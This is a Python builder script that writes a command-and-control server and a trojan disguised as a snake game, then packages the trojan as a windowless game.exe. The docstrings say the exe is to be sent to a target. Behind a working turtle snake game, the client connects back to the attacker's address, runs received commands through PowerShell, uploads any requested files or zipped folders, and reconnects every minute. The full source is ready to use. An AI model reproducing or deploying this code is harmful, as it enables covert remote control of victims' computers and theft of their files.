'''
This will create the 2 files server.py and game.exe
game.exe is the file which has to be sent to the target machine
    It, when executed, will give us full access to the commandprompt of the target machine
    along with the ability to transfer files from the target machine to our machine
server.py will enable us to communicate (send commands and receive files) with the target machine
'''
import os
import shutil
from socket import gethostbyname, gethostname
address = gethostbyname(gethostname())

server = r'''"""
This is server.py
It will enable us to communicate (send commands and receive files) with the target machine
It works through a TCP connection on ''' + address + r'''
"""
#IMPORTS
import os
from pickle import loads
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from zipfile import ZipFile


#CONSTANTS
HEADER = 64
PORT = 5050
SERVER = "'''+address+r'''"
ADDRESS = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!DISCONNECT'
CLIENTS = {}
server = socket(AF_INET, SOCK_STREAM)
server.bind(ADDRESS)


#FUNCTIONS
def send_command():
    """
This function will take commands from the user
and send them to the target machine to be executed
"""
    while True:
        command = input('>>> ')
        if command:
            command = command.split('>')
            try:
                client = CLIENTS.get(command[0].strip())[0]
                command = '>'.join(command[1:]).strip()
                message = command.encode(FORMAT)
                client.send(f"{len(message):<{HEADER}}".encode(FORMAT) + message)
            except Exception:
                continue
def deal_client(client, address, message_type, message):
    """This function will process and display the information received from the client"""
    if message_type == 'NAME':
        name = input(f'What name do you wish to give {address}?'\
                     f'(Leave blank for {message})\t')
        name = name if name else message
        CLIENTS.update({name: (client, address)})
    elif message_type == 'FILE':
        file_dir = os.path.join(os.path.expanduser('~'), 'downloads', 'files')
        if not os.path.exists(file_dir):
            os.mkdir(file_dir)
        file_name, data = message
        file_name = os.path.join(file_dir, file_name)
        counter = 0
        while os.path.exists(file_name):
            counter += 1
            file_name = file_name.split('.')
            file_name[-2] = file_name[-2] + f' ({counter})'
            file_name = '.'.join(file_name)
        del counter
        with open(file_name, 'wb') as file:
            file.write(data)
        if file_name.endswith('.zip'):
            file_path = file_name[:len(file_name)-4]
            os.mkdir(file_path)
            with ZipFile(file_name, 'r') as file:
                file.extractall(file_path)
            os.remove(file_name)
    elif message_type in ('ERROR', 'UPDATE'):
        print(f'[{message_type}]', message, sep='\t')
    elif message_type == 'OUTPUT':
        print(message)
    else:
        print('[?]', message, sep='\t')
def handle_client(client, address):
    """
This function will receive information from the client
and send it for processing
"""
    print(f'[CONNECTION]:\t{address} connected')
    while True:
        try:
            try:
                message_length = int(client.recv(HEADER).decode(FORMAT))
            except Exception:
                continue
            if not message_length:
                continue
            message_type, message = loads(client.recv(message_length))
            if message == DISCONNECT_MESSAGE:
                for name, addr in CLIENTS.items():
                    if addr[0] == client:
                        removed_name = name
                del CLIENTS[removed_name]
                client.close()
                print(f'Client {removed_name}{address} DISCONNECTED')
                del removed_name
                break
            deal_client(client, address, message_type, message)
        except (ConnectionResetError, OSError):
            break
        except Exception:
            continue
def start():
    """
This is the main function
Runing this will start the process of exchange of data between this machine and the target machine
"""
    server.listen()
    print(f'[LISTENING]: server is listening on {SERVER}')
    while True:
        client, address = server.accept()
        client_thread = Thread(target=handle_client, args=(client, address))
        command_thread = Thread(target=send_command)
        client_thread.start()
        command_thread.start()


#MAIN
if __name__ == '__main__':
    start()
'''

game = r'''"""
This file has to be sent to the target machine
    It, when executed, will give us full access to the commandprompt of the target machine
    along with the ability to transfer files from the target machine to our machine
It is a snake game for the unknown target
"""
import turtle
import time
import random
class Snake:
    """This is the game for giving a purpose to this file for the target"""
    def __init__(self):
        self.delay = 0.1
        self.score = 0
        self.high_score = 0
        self.segments = []
        self.cheat = False
        self.initialize_window()
        self.initialize_head()
        self.initialize_food()
        self.initialize_pen()
        self.main()
        try:
            self.window.mainloop()
        except Exception:
            pass
    def initialize_window(self):
        """
This method will initialize the turtle window
for the game to be played
"""
        self.window = turtle.Screen()
        self.window.title("Snake Game by Ishaan")
        self.window.bgcolor("green")
        self.window.setup(width=600, height=600)
        self.window.tracer(0) # Turns off the screen updates
        self.window.listen()  # Keyboard bindings
        wasd_keys = ('w', 'a', 's', 'd')
        arrow_keys = ('Up', 'Left', 'Down', 'Right')
        num_keys = ('8', '4', '2', '6')
        for up_key, left_key, down_key, right_key in wasd_keys, arrow_keys, num_keys:
            self.window.onkeypress(self.up, up_key)
            self.window.onkeypress(self.down, down_key)
            self.window.onkeypress(self.left, left_key)
            self.window.onkeypress(self.right, right_key)
        self.window.onkeypress(self.play, "p")
        self.window.onkeypress(self.toggle_cheating, "space")
    def initialize_head(self):
        """This method will intialize the snake's head"""
        self.head = turtle.Turtle()
        self.head.speed(0)
        self.head.shape("square")
        self.head.color("black")
        self.head.penup()
        self.head.goto(0,1)
        self.head.direction = "stop"
    def initialize_food(self):
        """This method will intialize the snake's food"""
        self.food = turtle.Turtle()
        self.food.speed(0)
        self.food.shape("circle")
        self.food.color("red")
        self.food.penup()
        self.food.goto(0,100)
    def initialize_pen(self):
        """
This method will intialize the pen
for writting score on the screen
"""
        self.pen = turtle.Turtle()
        self.pen.speed(0)
        self.pen.shape("square")
        self.pen.color("white")
        self.pen.penup()
        self.pen.hideturtle()
        self.pen.goto(0, 260)
        self.pen.write("Score: 0  High Score: 0", align="center", font=("Courier", 24, "normal"))
    def up(self):
        """This method will make the snake move up"""
        if self.head.direction != "v":
            self.head.direction = "^"
    def down(self):
        """This method will make the snake move down"""
        if self.head.direction != "^":
            self.head.direction = "v"
    def left(self):
        """This method will make the snake move left"""
        if self.head.direction != ">":
            self.head.direction = "<"
    def right(self):
        """This method will make the snake move right"""
        if self.head.direction != "<":
            self.head.direction = ">"
    def add_segment(self):
        """
This method will add a segment to the snake
i.e. make the snake longer by one unit
"""
        segment = turtle.Turtle()
        segment.speed(0)
        segment.shape("square")
        segment.color("grey")
        segment.penup()
        self.segments.append(segment)
    def move(self):
        """This method will move the sanke in the chosen direction"""
        if self.head.direction == "^":
            self.head.sety(self.head.ycor() + 20)
        elif self.head.direction == "v":
            self.head.sety(self.head.ycor() - 20)
        elif self.head.direction == "<":
            self.head.setx(self.head.xcor() - 20)
        elif self.head.direction == ">":
            self.head.setx(self.head.xcor() + 20)
    def reset(self, reason):
        """
if not cheat:
    This method will reset the screen after the snake colides
if cheat:
    This method will make the snake appear on opposite side if it colides
"""
        if not self.cheat:
            time.sleep(0.5)
            self.head.goto(0,0)
            self.food.goto(0,100)
            self.head.direction = "stop"
            for segment in self.segments:
                segment.goto(1000, 1000)  # Making the segments disapear
            self.segments.clear()  # Clear the segments list
            self.score = 0  # Reset the score
            self.delay = 0.1  # Reset the delay
            self.pen.clear()
            self.pen.write(f"Score: {self.score}  High Score: {self.high_score}",
                           align="center", font=("Courier", 24, "normal"))
        elif reason!='s':
            if reason=='y':
                self.head.sety(-self.head.ycor())
            else:
                self.head.setx(-self.head.xcor())
    def main(self):
        """This method is the main gameloop"""
        try:
            while True:
                self.window.update()
                if not -290<self.head.xcor()<290:  # Check for a collision with the X border
                    self.reset("x")
                if not -290<self.head.ycor()<290:  # Check for a collision with the Y border
                    self.reset("y")
                if self.head.distance(self.food) < 20:  # Check for a collision with the food
                    food_spot = (random.randint(-290, 290), random.randint(-290, 290))
                    self.food.goto(*food_spot)  # Move the food to the random spot
                    self.add_segment()  # Add a segment
                    self.delay /= 1.1  # Shorten the delay
                    self.score += 10  # Increase the score
                    if self.score > self.high_score:
                        self.high_score = self.score
                        self.pen.clear()
                        self.pen.write(f"Score: {self.score}  High Score: {self.high_score}",
                                       align="center", font=("Courier", 24, "normal"))
                for index in range(len(self.segments)-1, 0, -1):
                    self.segments[index].goto(
                        self.segments[index-1].xcor(),
                        self.segments[index-1].ycor()
                        )  # Move the end segments first in reverse order
                if self.segments:
                    self.segments[0].goto(self.head.xcor(), self.head.ycor())
                self.move()
                for segment in self.segments:  # Check for head collision with the body segments
                    if segment.distance(self.head) < 20:
                        self.reset("s")
                if self.delay <= 0:
                    self.delay = 0.001
                time.sleep(self.delay)
        except Exception:
            pass
    def toggle_cheating(self):
        """This method toggles cheating for the user"""
        self.cheat = not self.cheat
    def play(self):
        """This method will move the food to the snake's head"""
        if self.cheat:
            self.food.setx(self.head.xcor())
            self.food.sety(self.head.ycor())

#================================================================

# IMPORTS
import os
from pickle import dumps
from shutil import make_archive
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread


# CONSTANTS
HEADER = 64
PORT = 5050
SERVER = "'''+address+r'''"
ADDRESS = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!DISCONNECT'
outputFile = os.path.join(os.path.expanduser("~"), "Downloads", "output.txt")
def send(message_type, message):
    """This function will send the data along with its type to the server"""
    message = dumps((message_type, message))
    client.send(f"{len(message):<{HEADER}}".encode(FORMAT) + message)
def receiving():
    """
This function will receive commands from the server
and execute them
"""
    connection = True
    while connection:
        try:
            try:
                message_length = int(client.recv(HEADER).decode(FORMAT))
            except Exception:
                continue
            if not message_length:
                continue
            message = client.recv(message_length).decode(FORMAT).strip()
            if not message:
                continue
            if message == DISCONNECT_MESSAGE:
                send('UPDATE', message)
                client.close()
                connection = False
                break
            if '--sendFile' in message:
                message = message.split(';')
                for index, command in enumerate(message):
                    if '--sendFile' in command:
                        files = [file.strip() for file in command[11:].split(',') if file]
                        message[index] = ''
                for file in files:
                    zipping = False
                    if not os.path.exists(file):
                        file = os.path.join(os.getcwd(), file)
                    if not os.path.exists(file):
                        continue
                    file_name = [path for path in file.split('\\') if path][-1]
                    if os.path.isdir(file):
                        file = make_archive(file_name, 'zip', file)
                        zipping = True
                        file_name += '.zip'
                    send('UPDATE', f'Sending {file_name}')
                    with open(file, 'rb') as file_handler:
                        data = file_handler.read()
                    send('FILE', (file_name, data))
                    send('UPDATE', f'Sent {file_name}')
                    if zipping:
                        os.remove(file)
                message = ';'.join(message)
            if not message:
                continue
            os.system(fr'powershell.exe {message} > {outputFile}')
            try:
                with open(outputFile, 'rt') as file:
                    message = file.read()
                send('OUTPUT', message)
                os.remove(outputFile)
            except Exception:
                send('ERROR', 'Some error occurred while executing your command')
        except:
            pass
SLEEPING_TIME = 60
# MAIN
if __name__ == '__main__':
    Thread(target=Snake).start()
    while True:
        client = socket(AF_INET, SOCK_STREAM)
        try:
            client.connect(ADDRESS)
            send('NAME', os.path.expanduser('~').split('\\')[2])
            receiving()
        except:
            time.sleep(SLEEPING_TIME)
'''

if __name__ == '__main__':
    cwd = os.getcwd()
    files = {'server': server, 'game': game}
    for file in files:
        with open(f'{file}.py', 'wt') as fileHandler:
            fileHandler.write(files.get(file))
    PRE_COMMAND = r'D:\Ishaan\Miscellanious\Virtual_Environment\Scripts\activate.bat&&'
    os.system(PRE_COMMAND + 'python -m pip install pyinstaller')
    os.system(PRE_COMMAND + f'cd {cwd}&&pyinstaller --onefile -w -i game.ico game.py')
    os.remove('game.spec')
    os.rename(r'dist\game.exe', 'game.exe')
    shutil.rmtree('build')
    shutil.rmtree('__pycache__')
    os.rmdir('dist')
